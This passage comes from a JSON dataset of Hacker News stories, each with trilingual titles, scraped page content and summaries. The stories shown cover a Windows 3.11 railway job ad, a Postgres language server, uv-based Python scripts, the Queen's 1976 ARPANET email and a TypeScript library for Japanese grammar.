month) {\nlocalStorage.setItem(this.key, btoa('[]'));\nlocalStorage.setItem(this.propsKey, []);\nlocalStorage.setItem(this.flushKey, month);\n}\nconst currentUrl = location.pathname;\nconst urls = JSON.parse(atob(localStorage.getItem(this.key) || btoa('[]')));\nconst props = JSON.parse(localStorage.getItem(this.propsKey)|| '[]');\nif (!urls.includes(currentUrl) && this.getProps().length < 20 || this.getProps().length <1) {\nurls.push(currentUrl);\nif (window.ffte && window.ffte.properties) {\nprops.push(window.ffte.properties);\nconsole.log(\"props push\", props)\n}\nlocalStorage.setItem(this.key, btoa(JSON.stringify(urls)));\nlocalStorage.setItem(this.propsKey, JSON.stringify(props));\n}\nconsole.info(\"FUTR.Connect.userNav - Urls Stored\");\n} catch (e) {\nconsole.warn('userNav:', e);\n}\n}\n}\ngetHistory() {\ntry {\nreturn JSON.parse(atob(localStorage.getItem(this.key) || btoa('[]')));\n} catch {\nreturn [];\n}\n}\ngetProps() {\ntry {\nreturn JSON.parse(localStorage.getItem(this.propsKey) || '[]');\n} catch {\nreturn [];\n}\n}\n};\nFUTR.Connect.userNav = new userNav();\nconsole.info(\"FUTR.Connect.userNav - Init - Done\", FUTR.Connect.userNav);\n}",
    "summary": {
      "en": "A German railway company recently advertised a job for a Windows 3.11 Administrator, needing someone experienced with this 30-year-old operating system and MS-DOS. The job involves managing systems with very old hardware—specifically, 166MHz processors and 8MB of RAM. These outdated systems are still crucial for operating display boards on trains, showing real-time technical data to drivers. While it may seem concerning that modern railways rely on such ancient software, many critical systems stay with older technology because they are deemed reliable. The job listing was quickly removed, but it indicates that these legacy systems may remain in use until at least 2030.",
      "ko": "최근 독일의 한 철도 회사가 30년 된 운영 체제인 윈도우 3.11과 MS-DOS에 대한 경험이 있는 관리자를 구하는 채용 공고를 냈다. 이 직무는 166MHz 프로세서와 8MB RAM을 갖춘 매우 오래된 하드웨어를 관리하는 일을 포함한다. 이러한 구식 시스템은 기차의 디스플레이 보드를 운영하는 데 여전히 중요하며, 운전사에게 실시간 기술 데이터를 제공한다. 현대의 철도 시스템이 이렇게 오래된 소프트웨어에 의존하고 있다는 사실은 다소 우려스러울 수 있지만, 많은 중요한 시스템은 신뢰성이 높다고 평가받아 구형 기술을 계속 사용하고 있다. 이 채용 공고는 빠르게 삭제되었지만, 이러한 레거시 시스템이 최소한 2030년까지는 계속 사용될 가능성이 있음을 시사한다.",
      "ja": "ドイツの鉄道会社が最近、Windows 3.11の管理者を募集しました。このオペレーティングシステムは30年前のもので、MS-DOSの経験も求められています。仕事内容は、166MHzのプロセッサと8MBのRAMを搭載した非常に古いハードウェアを管理することです。これらの旧式のシステムは、列車の表示板を操作するために重要で、運転士にリアルタイムの技術データを提供しています。現代の鉄道がこのような古いソフトウェアに依存していることは心配に思えるかもしれませんが、多くの重要なシステムは信頼性が高いため、古い技術を使い続けています。この求人はすぐに削除されましたが、これらのレガシーシステムは少なくとも2030年まで使用される可能性があることを示しています。"
    }
  },
  {
    "id": "d427bd25f1a033c7",
    "title": {
      "en": "Postgres Language Server: Initial Release",
      "ko": "포스트그레스 언어 서버 출시",
      "ja": "Postgres言語サーバー登場"
    },
    "type": "story",
    "url": "https://github.com/supabase-community/postgres-language-server",
    "score": 294,
    "by": "steinroe",
    "time": 1743239623,
    "content": "Postgres Language Server\nA collection of language tools and a Language Server Protocol (LSP) implementation for Postgres, focusing on developer experience and reliable SQL tooling.\nDocs: pgtools.dev\nInstall: instructions\n\nCLI releases\nVSCode\nNeovim\n\nOverview\n\nLSP Demo\nCLI Demo\n\nThis project provides a toolchain for Postgres development, built on Postgres' own parser libpg_query to ensure 100% syntax compatibility. It is built on a Server-Client architecture with a transport-agnostic design. This means all features can be accessed not only through the Language Server Protocol, but also through other interfaces like a CLI, HTTP APIs, or a WebAssembly module. The goal is to make all the great Postgres tooling out there as accessible as possible, and to build anything that is missing ourselves.\nThe following features are implemented:\n\nAutocompletion\nSyntax Error Highlighting\nType-checking (via EXPLAIN error insights)\nLinter, inspired by Squawk\n\nOur current focus is on refining and enhancing these core features while building a robust and easily accessible infrastructure. For future plans and opportunities to contribute, please check out the issues and discussions. Any contributions are welcome!\nContributors\n\npsteinroe\njuleswritescode\n\nAcknowledgements\nA big thanks to the following projects, without which this project wouldn't have been possible:\n\nlibpg_query: For extracting the Postgres' parser\nBiome: For implementing a toolchain infrastructure we could copy from\nSquawk: For the linter inspiration",
    "summary": {
      "en": "**Postgres Language Server Summary**\n\nThe Postgres Language Server is a set of development tools for Postgres that enhances the SQL programming experience. It uses Postgres' own parser to ensure accurate syntax checking. The server can be accessed in various ways, including a command-line interface (CLI), HTTP APIs, and WebAssembly.\n\n**Key Features:**\n- Autocompletion\n- Syntax Error Highlighting\n- Type-checking using EXPLAIN error insights\n- Linter inspired by the tool Squawk\n\nThe project aims to improve these features and create a user-friendly infrastructure. Contributions are encouraged, and more information can be found in their discussions and issues.\n\n**Contributors:**\n- psteinroe\n- juleswritescode\n\n**Acknowledgements:**\nThanks to libpg_query, Biome, and Squawk for their support in developing this project.",
      "ko": "Postgres 언어 서버는 Postgres를 위한 개발 도구 모음으로, SQL 프로그래밍 경험을 향상시킵니다. 이 서버는 Postgres의 자체 파서를 사용하여 정확한 구문 검사를 보장합니다. 서버는 명령줄 인터페이스(CLI), HTTP API, WebAssembly 등 다양한 방법으로 접근할 수 있습니다.\n\n주요 기능으로는 자동 완성, 구문 오류 강조, EXPLAIN 오류 통찰력을 활용한 타입 검사, Squawk 도구에서 영감을 받은 린터가 있습니다. 이 프로젝트는 이러한 기능을 개선하고 사용자 친화적인 인프라를 만드는 것을 목표로 하고 있습니다. 기여를 환영하며, 더 많은 정보는 논의 및 이슈에서 확인할 수 있습니다.\n\n기여자에는 psteinroe와 juleswritescode가 있습니다. 이 프로젝트 개발을 지원해 준 libpg_query, Biome, Squawk에 감사드립니다.",
      "ja": "Postgres Language Serverは、Postgres用の開発ツールセットで、SQLプログラミングの体験を向上させます。このサーバーは、Postgres独自のパーサーを使用して、正確な構文チェックを行います。コマンドラインインターフェース（CLI）、HTTP API、WebAssemblyなど、さまざまな方法でアクセスできます。\n\n主な機能には、オートコンプリート、構文エラーのハイライト、EXPLAINエラーの洞察を利用した型チェック、ツールSquawkに触発されたリンターがあります。このプロジェクトは、これらの機能を改善し、使いやすいインフラを構築することを目指しています。貢献を歓迎しており、詳細はディスカッションや課題で確認できます。\n\n貢献者には、psteinroeさんとjuleswritescodeさんがいます。プロジェクトの開発にあたり、libpg_query、Biome、Squawkに感謝します。"
    }
  },
  {
    "id": "0d83769ff3100414",
    "title": {
      "en": "Self-contained Python scripts with uv",
      "ko": "독립형 파이썬 스크립트",
      "ja": "自己完結型Pythonスクリプト"
    },
    "type": "story",
    "url": "http://blog.dusktreader.dev/2025/03/29/self-contained-python-scripts-with-uv/",
    "score": 7,
    "by": "todsacerdoti",
    "time": 1743290578,
    "content": "Python\n\n        uv\n\nSelf-contained Python scripts with uv\n\nTLDR\nYou can add uv into the shebang line for a Python script to make it a self-contained executable.\n\nI am working on a Go project to better learn the language. It's a simple API backed by a postgres database.\nWhen I need to test out an endpoint, I prefer to use the httpx python package inside an\nipython REPL over making curl requests. It's nice to be able to introspect responses and easily\npackage payloads with dicts instead of writing out JSON.\nAnyway, I decided to write a script to upsert some user data so that I can beat on my /users endpoint.\n\nMy jam_users.py script looks like this:\nimport httpx\nimport IPython\nfrom loguru import logger\n\nusers = [\n    dict(name=\"The Dude\", email=\"the.dude@abides.com\", password=\"thedudeabides\"),\n    dict(name=\"Walter Sobchak\", email=\"walter@sobchak-security.com\", password=\"vietnamvet\"),\n    dict(name=\"Donnie\", email=\"donniesurfs@yahoo.com\", password=\"iamthewalrus\"),\n    dict(name=\"Maude\", email=\"mauddie@avant-guard.com\", password=\"goodmanandthorough\"),\n]\n\nr = httpx.get(\"http://localhost:4000/v1/users\")\nr.raise_for_status()\n\nfor user in r.json()[\"users\"]:\n    logger.info(f\"Deleting: {user['name']}\")\n    r = httpx.delete(f\"http://localhost:4000/v1/users/{user['id']}\")\n    r.raise_for_status()\n\nfor user in users:\n    r = httpx.post(\"http://localhost:4000/v1/users\", json=user)\n    r.raise_for_status()\n    logger.info(f\"Created: {r.json()}\")\n\nIPython.embed()\n\nThis is really straight-forward. It will clear out any existing users and then insert these test users. Right after\nthat, I get dropped into an ipython repl to do what I need for testing. All I have to do is run:\npython jam_users.py\n\nHowever, if I want to run the script as-is, I will need to choose one of these approaches:\n\nInstall the dependencies httpx, IPython, and loguru globally in my system python\nCreate a virtual environment, activate it, install deps, and run my script while the venv is activated\n\nThese are both not great options in my opinion. These approaches also rely on having a system python installed that is\ncompatible with these packages. This isn't as big of a problem, but something to consider anyway.\nI've been using uv a lot lately, and I'm becoming quite enamoured with its usefulness\nas a package manager, efficiency as a pip replacement, and abilities for isolated python executables. One thing that I\nhaven't used much yet are the special # /// script tags in a python script.\nWhen I first read about this functionality, I was pretty skeptical. I'm not particularly keen on embedding syntax into\ncomments. However, this seemed like the perfect application. So, updated my script to include the deps in the script\nheader like so:\n# /// script\n# dependencies = [\"ipython\", \"httpx\", \"loguru\"]\n# ///\nimport httpx\nimport IPython\nfrom loguru import logger\n\n...\n\nWith this added, now I can run the script really easily with uv:\nuv run jam_users.py\n\nGreat! Now, uv will create an isolated virtual environment for the script, download the dependencies and install them,\nand then run my script in the context of that venv! I don't have to manage the virtual environment myself nor worry\nabout cluttering my system python with packages that I will invariably forget to remove later.\nOne nice thing about a regular Python script, though, is that you can make it executable with a shebang line:\n#!/usr/bin/env python\n...\n\nNow, if I make the script executable (chmod +x jam_users.py), I can invoke it directly as an executable script!\nHowever, this won't take advantage of the uv script header because Python itself will just ignore the comment.\nSo, I did some digging and found out that you can actually embed the invocation of the uv command right in the shebang\nline like so:\n#!/usr/bin/env -S uv run --script\n# /// script\n# dependencies = [\"ipython\", \"httpx\", \"loguru\"]\n# ///\nimport httpx\nimport IPython\nfrom loguru import logger\n\n...\n\nThis works because the -S flag tells the system to split everything after it into separate arguments before passing it\nto the system's env.\nNow (after chmod +x jam_users.py, of course), I can execute my script directly:\n./jam_users.py\n\nThat's it! What's even better is that I can run this script on any (Unix) system that has uv installed without needing\nto do ANY dependency or virtual environment management.\nNow, this script itself is really trivial and not much more than a toy example. However, in my past I have written\nrather complex scripts that I needed to hand off to other users to run. Of course, this always came with a long\nexplanation of how to prepare their system just to run the script. This approach solves that problem instantly and\npainlessly (as long as they have uv installed).\nTake it for a spin, and let me know your thoughts.\nThanks for reading!\n\n  Comments\n\n    var giscus = document.querySelector(\"script[src*=giscus]\")\n\n    // Set palette on initial load\n    var palette = __md_get(\"__palette\")\n    if (palette && typeof palette.color === \"object\") {\n      var theme = palette.color.scheme === \"slate\"\n        ? \"transparent_dark\"\n        : \"light\"\n\n      // Instruct Giscus to set theme\n      giscus.setAttribute(\"data-theme\", theme)\n    }\n\n    // Register event handlers after documented loaded\n    document.addEventListener(\"DOMContentLoaded\", function() {\n      var ref = document.querySelector(\"[data-md-component=palette]\")\n      ref.addEventListener(\"change\", function() {\n        var palette = __md_get(\"__palette\")\n        if (palette && typeof palette.color === \"object\") {\n          var theme = palette.color.scheme === \"slate\"\n            ? \"transparent_dark\"\n            : \"light\"\n\n          // Instruct Giscus to change theme\n          var frame = document.querySelector(\".giscus-frame\")\n          frame.contentWindow.postMessage(\n            { giscus: { setConfig: { theme } } },\n            \"https://giscus.app\"\n          )\n        }\n      })\n    })",
    "summary": {
      "en": "**Summary:**\n\nThe author describes how to create a self-contained executable Python script using the `uv` package. They have a script called `jam_users.py` that manages user data in a local API. Traditionally, running this script required setting up dependencies in a global Python environment or a virtual environment, which can be cumbersome.\n\nTo simplify this, the author uses `uv`, which allows embedding dependencies directly in the script header. By adding a special comment at the top of the script, they can run it using `uv` without manually managing dependencies or environments.\n\nThe author enhances the script's shebang line to allow it to be executed directly, making it easier to run on any Unix system with `uv` installed. This method eliminates the need for users to prepare their systems, streamlining the process of running Python scripts.\n\nOverall, this approach makes it easier to share and run Python scripts without worrying about dependency management.",
      "ko": "저자는 `uv` 패키지를 사용하여 독립 실행형 Python 스크립트를 만드는 방법을 설명합니다. 그들은 로컬 API에서 사용자 데이터를 관리하는 `jam_users.py`라는 스크립트를 가지고 있습니다. 전통적으로 이 스크립트를 실행하려면 전역 Python 환경이나 가상 환경에서 의존성을 설정해야 했는데, 이는 번거로운 작업이었습니다.\n\n이를 간소화하기 위해 저자는 `uv`를 사용합니다. `uv`는 스크립트 헤더에 의존성을 직접 포함할 수 있게 해줍니다. 스크립트 상단에 특별한 주석을 추가함으로써, 의존성이나 환경을 수동으로 관리하지 않고도 `uv`를 사용하여 실행할 수 있습니다.\n\n저자는 스크립트의 shebang 라인을 개선하여 직접 실행할 수 있도록 하여, `uv`가 설치된 모든 유닉스 시스템에서 쉽게 실행할 수 있게 합니다. 이 방법은 사용자가 시스템을 준비할 필요를 없애주어 Python 스크립트를 실행하는 과정을 간소화합니다.\n\n전반적으로 이 접근 방식은 의존성 관리에 대한 걱정 없이 Python 스크립트를 공유하고 실행하는 것을 더 쉽게 만들어 줍니다.",
      "ja": "著者は、`uv`パッケージを使用して自己完結型の実行可能なPythonスクリプトを作成する方法を説明しています。彼らは、ローカルAPIでユーザーデータを管理する`jam_users.py`というスクリプトを持っています。従来、このスクリプトを実行するには、グローバルなPython環境や仮想環境で依存関係を設定する必要があり、手間がかかりました。\n\nこれを簡素化するために、著者は`uv`を利用します。これにより、依存関係をスクリプトのヘッダーに直接埋め込むことができます。スクリプトの先頭に特別なコメントを追加することで、手動で依存関係や環境を管理することなく、`uv`を使って実行できるようになります。\n\n著者は、スクリプトのシェバン行を強化し、直接実行できるようにしました。これにより、`uv`がインストールされた任意のUnixシステムで簡単に実行できるようになります。この方法により、ユーザーがシステムを準備する必要がなくなり、Pythonスクリプトの実行プロセスが簡素化されます。\n\n全体として、このアプローチは依存関係の管理を気にせずにPythonスクリプトを共有し、実行することを容易にします。"
    }
  },
  {
    "id": "c07a2f6dab748318",
    "title": {
      "en": "How the Queen of England Beat Everyone to the Internet",
      "ko": "영국 여왕의 인터넷 승리",
      "ja": "女王のネット制覇"
    },
    "type": "story",
    "url": "https://www.wired.com/2012/12/queen-and-the-internet/",
    "score": 22,
    "by": "rbanffy",
    "time": 1743079903,
    "content": "Cade MetzBusinessDec 25, 2012 6:30 AMHow the Queen of England Beat Everyone to the InternetPeter Kirstein is the man who put the Queen of England on the internet. In 1976.Queen Elizabeth II, on the internet, in 1976.Photo: Peter KirsteinSave this storySaveSave this storySavePeter Kirstein is the man who put the Queen of England on the internet. In 1976.That's Her Majesty in the photo above, and if the year isn't immediately obvious from the computer terminal she's typing on -- or from her attire -- you can find it on the wall, just to her left, printed on one of the signs trumpeting the arrival of the ARPANET.The date was March 26, 1976, and the ARPANET -- the computer network that eventually morphed into the internet -- had just come to the Royal Signals and Radar Establishment, a telecommunications research center in Malvern, England. The Queen was on hand to christen the connection, and in the process, she became one of the first heads of state to send an e-mail.It was Peter Kirstein who set up her mail account, choosing the username \"HME2.\" That's Her Majesty, Elizabeth II. \"All she had to do was press a couple of buttons,\" he remembers, \"and her message was sent.\"Kirstein's role in the first royal e-mail was only appropriate. He's also the man who first brought the ARPANET to Great Britain, setting up a network node at the University of London in 1973. Throughout the '70s and on into the '80s, he would oversee Britain's presence on ARPANET and help push this sprawling research network onto the all-important TCP/IP protocols that gave rise to the worldwide internet as we know it today.This past April, in recognition of his dogged pursuit of internetworking in Great Britain -- if not his deft choice of royal usernames -- Kirstein was inducted into the Internet Society's (ISOC) Internet Hall of Fame. Part of the hall's inaugural class, he was joined by such names as Vint Cerf, Bob Kahn and Tim Berners-Lee.Kirstein grew up in Britain. He studied mathematics and engineering at Cambridge and the University of London. And after completing his PhD, he was a researcher with General Electric in Zurich, Switzerland. But over the years, he also spent quite a bit of time at Stanford University and the University of California, Los Angeles (UCLA) in the States.In the 60s, at UCLA, he met Vint Cerf -- who would one day help create the TCP/IP protocols -- and as the 70s rolled around and he settled into professorship at the University of London, he had developed relationships with various other researchers who had recently spread the ARPANET across various U.S. research operations, including Larry Roberts, the man who originally designed the thing for the U.S. Department of Defense.When Roberts decided that the ARPAnet should stretch from the U.S. to Norway and Britain via an existing trans-Atlantic telecommunications link, Kirstein was chosen to facilitate the British connection. The original idea was to connect the ARPANET to the network built by Britain's National Physical Laboratory and Donald Davies -- who coined the term network packet and played a role in the early design of the ARPANET -- but according to Kirstein, a link to the NPL was ruled out because of political reasons. The UK was working to get into the European Economic Community, and apparently, Europe would frown on that sort of direct cooperation between the NPL and the U.S. Defense Department. So the task fell to Kirstein instead.Most PopularPoliticsDOGE Plans to Rebuild SSA Code Base in Months, Risking Benefits and System CollapseBy Makena KellyThe Big StoryIf Anthropic Succeeds, a Nation of Benevolent AI Geniuses Could Be BornBy Steven LevySecurityEven More Venmo Accounts Tied to Trump Officials in Signal Group Chat Left Data PublicBy Dhruv MehrotraSecurity NewsMike Waltz Left His Venmo Friends List PublicBy Dhruv MehrotraWith a year's worth of funding from the British Post Office for the link between Norway and Britain (the trans-Atlantic connection went to Norway first) and an additional 5,000 pounds from Davies and the NPL, Kirsten set up his ARPANET node at the University of London.Peter Kirstein.\nPhoto: Internet Hall of FameHe would take the network to other parts of Great Britain -- including the Royal Signals and Radar Establishment -- but he also helped hook the ARPANET into SATNET, a satellite network that could connect various other European countries. Kirstein was on the other end of the line in November 1977, when researchers riding across Northern California in a bread truck first used TCP/IP to send data across three separate networks: a packet radio wireless network, the ARPANET, and SATNET. The message bounced from San Francisco to Norway and Britain and back again in an demonstration of what Vint Cerf calls \"true inter-networking.\"By 1983, TCP/IP was officially rolled out across the ARPANET, and as other networks adopted the protocols in the coming years, the internet was born.It was revolution in digital communication. But to the Queen, it was old hat. She could even say that the first message she sent across the ARPANET in 1976 wasn't without some real hacker cred. The Royal Signals and Radar Establishment has developed a programming language called Coral 66 -- it's also mentioned on the wall, just to her left -- and this was the subject of her missive.“This message to all ARPANET users announces the availability on ARPANET of the Coral 66 compiler provided by the GEC 4080 computer at the Royal Signals and Radar Establishment, Malvern, England,\" the message read. \"Coral 66 is the standard real-time high level language adopted by the Ministry of Defence.\"",
    "summary": {
      "en": "In 1976, Peter Kirstein helped connect Queen Elizabeth II to the internet by setting up her email account at the Royal Signals and Radar Establishment in England. This event marked her as one of the first world leaders to send an email. The Queen's username was \"HME2,\" and her first message announced the availability of a programming language called Coral 66 on the ARPANET, the precursor to the internet.\n\nKirstein played a crucial role in bringing the ARPANET to the UK, establishing a connection at the University of London in 1973 and later expanding it to other locations. He facilitated this connection despite initial plans being hindered by political issues. His work contributed to the development of TCP/IP protocols, which led to the creation of the modern internet. In recognition of his contributions, Kirstein was inducted into the Internet Hall of Fame in 2012.",
      "ko": "1976년, 피터 커스틴은 영국의 로열 시그널스 및 레이더 연구소에서 엘리자베스 2세 여왕의 이메일 계정을 설정하여 여왕이 인터넷에 연결되도록 도왔습니다. 이 사건은 여왕이 이메일을 보낸 세계 지도자 중 한 명으로 기록되는 계기가 되었습니다. 여왕의 사용자 이름은 \"HME2\"였으며, 그녀의 첫 번째 메시지는 ARPANET에서 프로그래밍 언어인 코랄 66의 사용 가능성을 알리는 내용이었습니다. \n\n커스틴은 ARPANET을 영국에 도입하는 데 중요한 역할을 했습니다. 그는 1973년 런던 대학교에서 연결을 설정하고, 이후 다른 장소로도 확장했습니다. 초기 계획이 정치적 문제로 지연되었음에도 불구하고 그는 이 연결을 가능하게 했습니다. 그의 노력은 TCP/IP 프로토콜 개발에 기여하였고, 이는 현대 인터넷의 탄생으로 이어졌습니다. 그의 공로를 인정받아 커스틴은 2012년 인터넷 명예의 전당에 헌액되었습니다.",
      "ja": "1976年、ピーター・カースタインはエリザベス2世女王のインターネット接続を手助けし、イギリスのロイヤル・シグナルズ・アンド・レーダー・エスタブリッシュメントで彼女のメールアカウントを設定しました。この出来事により、女王はメールを送信した最初の世界の指導者の一人となりました。女王のユーザー名は「HME2」で、最初のメッセージではARPANET上で「コーラル66」というプログラミング言語が利用可能になったことを知らせました。ARPANETはインターネットの前身です。\n\nカースタインはARPANETをイギリスに導入する重要な役割を果たしました。1973年にロンドン大学で接続を確立し、その後他の場所にも拡大しました。最初の計画は政治的な問題で妨げられましたが、彼はその接続を実現しました。彼の業績は、現代のインターネットを作り上げることにつながるTCP/IPプロトコルの開発に寄与しました。彼の貢献が評価され、2012年にはインターネットの殿堂入りを果たしました。"
    }
  },
  {
    "id": "148908385d3e8e2d",
    "title": {
      "en": "Typed Japanese",
      "ko": "타이핑 일본어",
      "ja": "タイピング日本語"
    },
    "type": "story",
    "url": "https://github.com/typedgrammar/typed-japanese",
    "score": 82,
    "by": "Philpax",
    "time": 1743255374,
    "content": "🌸 Typed Japanese\nIf you can write TypeScript, you can understand Japanese!\n\nTyped Japanese is a TypeScript type-level library that enables the expression of complete Japanese sentences through the type system. It creates a domain-specific language (DSL) based on Japanese grammar rules, allowing a subset of grammatically correct natural language to be written and verified using TypeScript's compiler.\nThis project also explores an intermediate format for AI in language learning. For example, LLMs could return grammar analysis of Japanese sentences using this format instead of JSON, enabling verification through TypeScript's type checker to improve correctness.\n\n📖 Want to learn more? Check out our detailed blog post which explains how the TypeScript type system can be used to learn Japanese grammar from the ground up. The article starts with basic programming concepts and gradually builds up to complex Japanese grammatical structures like conditional sentences and interrogative phrases.\n\n// Define the proper noun \"ヒンメル\"\ntype ヒンメル = ProperNoun<\"ヒンメル\">;\n\n// Define する verb\ntype する = IrregularVerb & { dictionary: \"する\" };\n\n// Create the そうした pattern (past form of そうする)\ntype そうした = DemonstrativeAction<Demonstrative & \"そう\", する, \"た形\">;\n\n// Create the conditional phrase \"ヒンメルならそうした\"\ntype ヒンメルならそうした = ConditionalPhrase<ヒンメル, \"なら\", そうした>;\n\n// Type checking examples\nconst properExample: ヒンメルならそうした = \"ヒンメルならそうした\"; // \"If it were Himmel, he would do so\"\n// 如果是辛美尔的话，他也会这么做的\n\n🤖 Verb System\nVerb Classes\nJapanese verbs are categorized into three main classes:\n\nGodan Verbs (五段動詞) - Also known as \"Group 1\" or \"u-verbs\"\n\nEndings: う, く, ぐ, す, つ, ぬ, ぶ, む, る\nExamples: 話す (hanasu - to speak), 書く (kaku - to write)\n\nIchidan Verbs (一段動詞) - Also known as \"Group 2\" or \"ru-verbs\"\n\nAlways end with る\nExamples: 食べる (taberu - to eat), 見る (miru - to see)\n\nIrregular Verbs (不規則動詞) - Only two main verbs\n\nする (suru - to do)\n来る (kuru - to come)\n\nVerb Conjugation Forms\nThe system supports these conjugation forms:\n\n辞書形 (Dictionary form)\nます形 (Polite form)\nて形 (Te form)\nた形 (Past form)\nない形 (Negative form)\n可能形 (Potential form)\n受身形 (Passive form)\n使役形 (Causative form)\n意向形 (Volitional form)\n命令形 (Imperative form)\n条件形 (Conditional form)\n仮定形 (Hypothetical form)\n\ntype 買う = GodanVerb & { stem: \"買\"; ending: \"う\" };\ntype 買うて形 = ConjugateVerb<買う, \"て形\">; // 買って\ntype 買うた形 = ConjugateVerb<買う, \"た形\">; // 買った\n\ntype 食べる = IchidanVerb & { stem: \"食べ\"; ending: \"る\" };\ntype 食べるて形 = ConjugateVerb<食べる, \"て形\">; // 食べて\ntype 食べるた形 = ConjugateVerb<食べる, \"た形\">; // 食べた\n\n🎨 Adjective System\nJapanese adjectives are categorized into two main classes:\n\nI-Adjectives (い形容詞) - End with い\n\nExamples: いい (good), 楽しい (fun), 高い (expensive)\n\nNa-Adjectives (な形容詞) - Require な when modifying nouns\n\nExamples: 綺麗 (pretty), 静か (quiet), 好き (liked)\n\nAdjective Conjugation Forms\nThe system supports these conjugation forms for adjectives:\n\n基本形 (Basic form)\n丁寧形 (Polite form)\n過去形 (Past form)\n否定形 (Negative form)\n\ntype いい = IAdjective & { stem: \"い\"; ending: \"い\"; irregular: true };\ntype 綺麗 = NaAdjective & { stem: \"綺麗\" };\n\n📚 Phrase and Sentence Composition\nThe system now supports:\n\nAdjectives and verbs with particles\nConnecting phrases with Japanese punctuation\nBasic sentence structures\nConditional expressions with particles like なら\nDemonstrative forms with actions\n\nExample: Connecting simple adjective and imperative verb phrases\n// I-adjective \"ii\" (good) with irregular conjugation\n// Then add particle \"yo\" to basic form of \"ii\" -> \"ii yo\"\ntype いい = IAdjective & { stem: \"い\"; ending: \"い\"; irregular: true };\ntype いいよ = PhraseWithParticle<ConjugateAdjective<いい, \"基本形\">, \"よ\">;\n\n// Irregular verb \"kuru\" (to come)\n// Then add particle \"yo\" to imperative form of \"kuru\" -> \"koi yo\"\ntype 来る = IrregularVerb & { dictionary: \"来る\" };\ntype 来いよ = PhraseWithParticle<ConjugateVerb<来る, \"命令形\">, \"よ\">;\n\n// Connect both phrases -> \"ii yo, koi yo\"\ntype いいよ来いよ = ConnectedPhrases<いいよ, 来いよ>;\n\n// Type checking examples\nconst correctPhrase1: いいよ = \"いいよ\"; // \"It's good!\" (114)\nconst correctPhrase2: 来いよ = \"来いよ\"; // \"Come here!\" (514)\nconst correctFullPhrase: いいよ来いよ = \"いいよ、来いよ\"; // \"It's good, come here!\"\n\nExample: More flexible component-based sentence construction\ntype SentenceParts = [\n  AdverbPart<\"なんで\">, // \"Why\" - question adverb\n  IntensifierPart<\"そんなに\">, // \"So much\" - intensifier\n  VerbPart<慣れる, \"て形\">, // \"Get used to\" in te-form\n  ContractedPart<\"ん\">, // Contraction of \"の\" - colloquial nominalizer\n  ParticlePart<\"だ\">, // Copula \"is\"\n  ParticlePart<\"よ\"> // Emphatic sentence-ending particle\n];\n\n// Combines all parts into a single string\ntype JoinedSentence = JoinPhrasePartsValue<SentenceParts>;\nconst joinedSentence: JoinedSentence = \"なんでそんなに慣れてんだよ\"; // \"Why are you so used to it?!\"\n// 你为什么这么熟练啊？\n\n⚙️ Technical Implementation\nThe system uses TypeScript's template literal types, conditional types, and mapped types to create a purely type-level representation of Japanese grammatical rules.\nKey components:\n\nType definitions for grammatical elements\nRule mapping via conditional types\nString literal manipulation for form generation\nType inference for grammatical validation\n\n💡 Why Typed Japanese?\n\nEducational tool - Learn Japanese grammar through code\nAI-assisted learning - Provide structured formats for language analysis\nGrammar verification - Express and verify Japanese grammar in code\nIntegration potential - Basis for typed Japanese language tools\n\n⚠️ Limitations\n\nThis is a type-level system only - it doesn't provide runtime functionality\nThe system handles standard forms but doesn't account for linguistic nuances\nSome rare or archaic language patterns may not be accurately represented\n\nThis project is still in very early stages and heavily relies on LLM-generated grammar rules, which may occasionally contain hallucinations or inaccuracies. If you find any issue during actual use, please help by confirming and providing feedback.\n🛠️ Development\nIf you're interested in contributing to or experimenting with Typed Japanese:\n\nEnsure you have Node.js and pnpm installed\nClone the repository\nInstall dependencies: pnpm install\nRun the tests: pnpm test\n\nThe tests validate that the type system functions correctly and all grammatical rules are properly implemented.\nWe welcome contributions! Feel free to open issues for bugs or feature requests, or submit pull requests with improvements.\n📬 Contact\nFor sponsorship opportunities, research collaborations, or commercial inquiries, please reach out to contact@typedgrammar.com.\n⚖️ License\nMIT\nCopyright (c) 2025-present, Yifeng Wang",
    "summary": {
      "en": "**Summary of Typed Japanese**\n\nTyped Japanese is a TypeScript library that allows you to express complete Japanese sentences using TypeScript's type system. By following Japanese grammar rules, it creates a specialized language that can be checked for correctness by the TypeScript compiler. This project also aims to enhance language learning by providing a structured format for AI to analyze Japanese grammar.\n\n### Key Features:\n- **Grammar Support**: The library supports Japanese verbs (Godan, Ichidan, and irregular verbs) and adjectives (I-adjectives and Na-adjectives), offering various conjugation forms.\n- **Phrase Construction**: Users can create sentences with verbs, adjectives, and particles, enabling flexible sentence structures.\n- **Educational Tool**: It serves as a way to learn Japanese grammar through coding, allowing users to express and verify grammatical rules.\n\n### Technical Aspects:\n- The library uses TypeScript's advanced type features to represent Japanese grammar purely at the type level.\n- It focuses on standard language forms, but may not cover all linguistic nuances.\n\n### Limitations:\n- The system is for type-level representation only and does not provide runtime functionality.\n- It may not accurately represent rare or archaic language patterns.\n\n### Development:\nTo contribute or experiment with Typed Japanese, users need Node.js and pnpm installed to run tests and validate the system.\n\nFor more information, check the detailed blog post or contact the developers at contact@typedgrammar.com. The project is open to contributions and feedback.",
